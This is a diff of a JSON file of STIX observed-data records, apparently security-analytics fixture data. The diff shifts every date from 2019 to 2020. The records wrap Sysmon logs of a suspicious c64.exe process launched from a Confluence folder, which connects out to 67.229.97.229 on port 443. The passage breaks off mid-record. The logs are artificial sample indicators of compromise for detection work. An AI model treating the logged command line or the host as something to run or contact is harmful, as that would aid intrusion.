@@ -12,8 +12,8 @@
             "id": "observed-data--439c662d-5ddd-453f-afe4-1d00faf87531",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-15T17:19:31.981Z",
-            "modified": "2019-10-15T17:19:31.981Z",
+            "created": "2020-01-15T17:19:31.981Z",
+            "modified": "2020-01-15T17:19:31.981Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -82,19 +82,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:57:59 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+                "utf8_payload": "<182>Oct 14 19:57:59 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
                 "magnitude": 2
             },
-            "first_observed": "2019-10-15T23:58:00.151Z",
-            "last_observed": "2019-10-15T23:58:00.151Z",
+            "first_observed": "2020-01-15T23:58:00.151Z",
+            "last_observed": "2020-01-15T23:58:00.151Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--ccefc459-9b51-4358-9704-614e0a99dea9",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-15T17:19:31.985Z",
-            "modified": "2019-10-15T17:19:31.986Z",
+            "created": "2020-01-15T17:19:31.985Z",
+            "modified": "2020-01-15T17:19:31.986Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -157,19 +157,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:57:59 192.168.0.8 <13>Oct 01 19:29:15 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=DESKTOP-JUB5P3F\tOriginatingComputer=DESKTOP-JUB5P3F\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=3\tEventIDCode=3\tEventType=4\tEventCategory=3\tRecordNumber=66086711\tTimeGenerated=1569954555\tTimeWritten=1569954555\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_NETWORK_CONNECT\tOpcode=Info\tMessage=Network connection detected: RuleName: Usermode UtcTime: 2019-10-01 18:29:16.688 ProcessGuid: {0a46fc2f-9af3-5d93-0000-001028386407} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe User: WinServer\\admin Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 192.168.0.8 SourceHostname: winserver SourcePort: 54792 SourcePortName:  DestinationIsIpv6: false DestinationIp: 67.229.97.229 DestinationHostname:  DestinationPort: 443 DestinationPortName: https\r\n",
+                "utf8_payload": "<182>Oct 14 19:57:59 192.168.0.8 <13>Oct 01 19:29:15 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=DESKTOP-JUB5P3F\tOriginatingComputer=DESKTOP-JUB5P3F\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=3\tEventIDCode=3\tEventType=4\tEventCategory=3\tRecordNumber=66086711\tTimeGenerated=1569954555\tTimeWritten=1569954555\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_NETWORK_CONNECT\tOpcode=Info\tMessage=Network connection detected: RuleName: Usermode UtcTime: 2020-01-01 18:29:16.688 ProcessGuid: {0a46fc2f-9af3-5d93-0000-001028386407} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe User: WinServer\\admin Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 192.168.0.8 SourceHostname: winserver SourcePort: 54792 SourcePortName:  DestinationIsIpv6: false DestinationIp: 67.229.97.229 DestinationHostname:  DestinationPort: 443 DestinationPortName: https\r\n",
                 "magnitude": 3
             },
-            "first_observed": "2019-10-15T23:58:00.151Z",
-            "last_observed": "2019-10-15T23:58:00.151Z",
+            "first_observed": "2020-01-15T23:58:00.151Z",
+            "last_observed": "2020-01-15T23:58:00.151Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--e03a0b0d-8388-4cbb-973d-42a88ed8bd6c",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:31.987Z",
-            "modified": "2019-10-16T17:19:31.987Z",
+            "created": "2020-01-16T17:19:31.987Z",
+            "modified": "2020-01-16T17:19:31.987Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -238,19 +238,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:58:00 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+                "utf8_payload": "<182>Oct 14 19:58:00 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
                 "magnitude": 2
             },
-            "first_observed": "2019-10-14T23:58:00.151Z",
-            "last_observed": "2019-10-14T23:58:00.151Z",
+            "first_observed": "2020-01-14T23:58:00.151Z",
+            "last_observed": "2020-01-14T23:58:00.151Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--6dfcda07-f325-45e7-a078-7a2ccca8c4b9",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:31.988Z",
-            "modified": "2019-10-16T17:19:31.988Z",
+            "created": "2020-01-16T17:19:31.988Z",
+            "modified": "2020-01-16T17:19:31.988Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -313,19 +313,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:58:00 192.168.0.8 <13>Oct 01 19:29:15 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=DESKTOP-JUB5P3F\tOriginatingComputer=DESKTOP-JUB5P3F\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=3\tEventIDCode=3\tEventType=4\tEventCategory=3\tRecordNumber=66086711\tTimeGenerated=1569954555\tTimeWritten=1569954555\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_NETWORK_CONNECT\tOpcode=Info\tMessage=Network connection detected: RuleName: Usermode UtcTime: 2019-10-01 18:29:16.688 ProcessGuid: {0a46fc2f-9af3-5d93-0000-001028386407} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe User: WinServer\\admin Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 192.168.0.8 SourceHostname: winserver SourcePort: 54792 SourcePortName:  DestinationIsIpv6: false DestinationIp: 67.229.97.229 DestinationHostname:  DestinationPort: 443 DestinationPortName: https\r\n",
+                "utf8_payload": "<182>Oct 14 19:58:00 192.168.0.8 <13>Oct 01 19:29:15 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=DESKTOP-JUB5P3F\tOriginatingComputer=DESKTOP-JUB5P3F\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=3\tEventIDCode=3\tEventType=4\tEventCategory=3\tRecordNumber=66086711\tTimeGenerated=1569954555\tTimeWritten=1569954555\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_NETWORK_CONNECT\tOpcode=Info\tMessage=Network connection detected: RuleName: Usermode UtcTime: 2020-01-01 18:29:16.688 ProcessGuid: {0a46fc2f-9af3-5d93-0000-001028386407} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe User: WinServer\\admin Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 192.168.0.8 SourceHostname: winserver SourcePort: 54792 SourcePortName:  DestinationIsIpv6: false DestinationIp: 67.229.97.229 DestinationHostname:  DestinationPort: 443 DestinationPortName: https\r\n",
                 "magnitude": 3
             },
-            "first_observed": "2019-10-14T23:58:00.650Z",
-            "last_observed": "2019-10-14T23:58:00.650Z",
+            "first_observed": "2020-01-14T23:58:00.650Z",
+            "last_observed": "2020-01-14T23:58:00.650Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--630bf095-f8f7-4431-978e-ab0ab7d1000e",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:31.989Z",
-            "modified": "2019-10-16T17:19:31.989Z",
+            "created": "2020-01-16T17:19:31.989Z",
+            "modified": "2020-01-16T17:19:31.989Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -394,19 +394,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:58:00 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+                "utf8_payload": "<182>Oct 14 19:58:00 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
                 "magnitude": 2
             },
-            "first_observed": "2019-10-14T23:58:01.652Z",
-            "last_observed": "2019-10-14T23:58:01.652Z",
+            "first_observed": "2020-01-14T23:58:01.652Z",
+            "last_observed": "2020-01-14T23:58:01.652Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--103111bd-9cf3-4e48-986b-abb177c7033b",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:31.990Z",
-            "modified": "2019-10-16T17:19:31.990Z",
+            "created": "2020-01-16T17:19:31.990Z",
+            "modified": "2020-01-16T17:19:31.990Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -469,19 +469,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:58:00 192.168.0.8 <13>Oct 01 19:29:15 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=DESKTOP-JUB5P3F\tOriginatingComputer=DESKTOP-JUB5P3F\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=3\tEventIDCode=3\tEventType=4\tEventCategory=3\tRecordNumber=66086711\tTimeGenerated=1569954555\tTimeWritten=1569954555\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_NETWORK_CONNECT\tOpcode=Info\tMessage=Network connection detected: RuleName: Usermode UtcTime: 2019-10-01 18:29:16.688 ProcessGuid: {0a46fc2f-9af3-5d93-0000-001028386407} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe User: WinServer\\admin Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 192.168.0.8 SourceHostname: winserver SourcePort: 54792 SourcePortName:  DestinationIsIpv6: false DestinationIp: 67.229.97.229 DestinationHostname:  DestinationPort: 443 DestinationPortName: https\r\n",
+                "utf8_payload": "<182>Oct 14 19:58:00 192.168.0.8 <13>Oct 01 19:29:15 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=DESKTOP-JUB5P3F\tOriginatingComputer=DESKTOP-JUB5P3F\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=3\tEventIDCode=3\tEventType=4\tEventCategory=3\tRecordNumber=66086711\tTimeGenerated=1569954555\tTimeWritten=1569954555\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_NETWORK_CONNECT\tOpcode=Info\tMessage=Network connection detected: RuleName: Usermode UtcTime: 2020-01-01 18:29:16.688 ProcessGuid: {0a46fc2f-9af3-5d93-0000-001028386407} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe User: WinServer\\admin Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 192.168.0.8 SourceHostname: winserver SourcePort: 54792 SourcePortName:  DestinationIsIpv6: false DestinationIp: 67.229.97.229 DestinationHostname:  DestinationPort: 443 DestinationPortName: https\r\n",
                 "magnitude": 3
             },
-            "first_observed": "2019-10-14T23:58:01.652Z",
-            "last_observed": "2019-10-14T23:58:01.652Z",
+            "first_observed": "2020-01-14T23:58:01.652Z",
+            "last_observed": "2020-01-14T23:58:01.652Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--986bc4dd-6442-4ef9-bcd3-c14b6cf7b1e6",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:31.992Z",
-            "modified": "2019-10-16T17:19:31.992Z",
+            "created": "2020-01-16T17:19:31.992Z",
+            "modified": "2020-01-16T17:19:31.992Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -550,19 +550,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:58:01 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+                "utf8_payload": "<182>Oct 14 19:58:01 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
                 "magnitude": 2
             },
-            "first_observed": "2019-10-14T23:58:01.652Z",
-            "last_observed": "2019-10-14T23:58:01.652Z",
+            "first_observed": "2020-01-14T23:58:01.652Z",
+            "last_observed": "2020-01-14T23:58:01.652Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--ed32dc5e-0bd4-4986-9ac6-0179deeae7ac",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:31.993Z",
-            "modified": "2019-10-16T17:19:31.993Z",
+            "created": "2020-01-16T17:19:31.993Z",
+            "modified": "2020-01-16T17:19:31.993Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -625,19 +625,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:58:01 192.168.0.8 <13>Oct 01 19:29:15 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=DESKTOP-JUB5P3F\tOriginatingComputer=DESKTOP-JUB5P3F\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=3\tEventIDCode=3\tEventType=4\tEventCategory=3\tRecordNumber=66086711\tTimeGenerated=1569954555\tTimeWritten=1569954555\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_NETWORK_CONNECT\tOpcode=Info\tMessage=Network connection detected: RuleName: Usermode UtcTime: 2019-10-01 18:29:16.688 ProcessGuid: {0a46fc2f-9af3-5d93-0000-001028386407} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe User: WinServer\\admin Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 192.168.0.8 SourceHostname: winserver SourcePort: 54792 SourcePortName:  DestinationIsIpv6: false DestinationIp: 67.229.97.229 DestinationHostname:  DestinationPort: 443 DestinationPortName: https\r\n",
+                "utf8_payload": "<182>Oct 14 19:58:01 192.168.0.8 <13>Oct 01 19:29:15 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=DESKTOP-JUB5P3F\tOriginatingComputer=DESKTOP-JUB5P3F\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=3\tEventIDCode=3\tEventType=4\tEventCategory=3\tRecordNumber=66086711\tTimeGenerated=1569954555\tTimeWritten=1569954555\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_NETWORK_CONNECT\tOpcode=Info\tMessage=Network connection detected: RuleName: Usermode UtcTime: 2020-01-01 18:29:16.688 ProcessGuid: {0a46fc2f-9af3-5d93-0000-001028386407} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe User: WinServer\\admin Protocol: tcp Initiated: true SourceIsIpv6: false SourceIp: 192.168.0.8 SourceHostname: winserver SourcePort: 54792 SourcePortName:  DestinationIsIpv6: false DestinationIp: 67.229.97.229 DestinationHostname:  DestinationPort: 443 DestinationPortName: https\r\n",
                 "magnitude": 3
             },
-            "first_observed": "2019-10-14T23:58:01.652Z",
-            "last_observed": "2019-10-14T23:58:01.652Z",
+            "first_observed": "2020-01-14T23:58:01.652Z",
+            "last_observed": "2020-01-14T23:58:01.652Z",
             "number_observed": 1
         },
         {
             "id": "observed-data--59ee4746-a3a5-4628-b7f5-5f0e2d0c136b",
             "type": "observed-data",
             "created_by_ref": "identity--f165428c-7b6a-4d77-89cc-33e66a10c541",
-            "created": "2019-10-16T17:19:31.994Z",
-            "modified": "2019-10-16T17:19:31.994Z",
+            "created": "2020-01-16T17:19:31.994Z",
+            "modified": "2020-01-16T17:19:31.994Z",
             "objects": {
                 "0": {
                     "type": "ipv4-addr",
@@ -706,19 +706,19 @@
                 "log_source_id": 1912,
                 "log_source_name": "Sysmon @ 192.168.0.8",
                 "identity_ip": "0.0.0.0",
-                "utf8_payload": "<182>Oct 14 19:58:01 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2019-10-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: SHA1=5bf6c98a52e80824d1a234bd5e673edb75c7dda9,MD5=846cdb921841ac671c86350d494abf9c,SHA256=dc52bdf5e3f71fb9ab3b1730d445287d16d3a3c8",
+                "utf8_payload": "<182>Oct 14 19:58:01 192.168.0.8 <13>Oct 03 14:53:35 WinServer AgentDevice=WindowsLog\tAgentLogFile=Microsoft-Windows-Sysmon/Operational\tPluginVersion=7.2.8.145\tSource=Microsoft-Windows-Sysmon\tComputer=WinServer\tOriginatingComputer=WinServer\tUser=SYSTEM\tDomain=NT AUTHORITY\tEventID=1\tEventIDCode=1\tEventType=4\tEventCategory=1\tRecordNumber=94214\tTimeGenerated=1570110813\tTimeWritten=1570110813\tLevel=Informational\tKeywords=0x8000000000000000\tTask=SysmonTask-SYSMON_CREATE_PROCESS\tOpcode=Info\tMessage=Process Create: RuleName:  UtcTime: 2020-01-03 13:53:33.538 ProcessGuid: {1C2D3F54-FD5D-5D95-0000-0010A02E0C00} ProcessId: 757 Image: C:\\Program Files\\Atlassian\\Confluence\\c64.exe CommandLine: c64.exe f64.data \"9839D7F1A0 -m\" CurrentDirectory: C:\\Windows\\ User: WinServer\\admin LogonGuid: {1C2D3F54-F735-5D95-0000-0020946D0400} LogonId: 0x46d94 TerminalSessionId: 1 IntegrityLevel: High Hashes: 